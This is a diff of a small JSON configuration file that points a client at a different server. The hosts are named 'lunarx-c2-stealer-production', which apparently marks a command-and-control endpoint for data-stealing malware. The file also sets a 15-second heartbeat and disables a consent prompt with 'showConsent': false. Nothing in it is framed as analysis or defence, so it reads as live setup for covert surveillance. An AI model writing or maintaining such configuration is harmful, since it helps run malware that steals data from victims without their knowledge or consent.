@@ -1,5 +1,5 @@
 {
-  "serverUrl": "https://lunarx-c2-stealer-production-3a65.up.railway.app",
+  "serverUrl": "https://lunarx-c2-stealer-production.up.railway.app",
   "heartbeatInterval": 15000,
   "showConsent": false
 }
